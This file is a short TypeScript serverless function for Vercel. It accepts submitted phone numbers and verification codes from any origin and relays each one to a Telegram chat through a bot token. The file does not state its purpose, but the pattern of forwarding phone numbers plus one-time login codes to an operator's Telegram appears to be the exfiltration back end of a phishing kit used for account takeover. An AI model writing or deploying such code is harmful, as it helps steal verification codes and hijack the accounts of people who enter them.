// API route for sending data to Telegram bot
// This is a Vercel serverless function

import { VercelRequest, VercelResponse } from '@vercel/node';

interface TelegramData {
  type: 'phone' | 'verification';
  value: string;
}

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { type, value }: TelegramData = req.body;

  if (!type || !value) {
    return res.status(400).json({ message: 'Missing required fields' });
  }

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({ message: 'Telegram configuration missing' });
  }

  const message = type === 'phone' 
    ? `🔢 New phone number: ${value}`
    : `🔐 Verification code: ${value}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!response.ok) {
      const errorData = await response.text();
      console.error('Telegram API error:', errorData);
      throw new Error('Failed to send message to Telegram');
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Telegram API error:', error);
    res.status(500).json({ message: 'Failed to send message' });
  }
}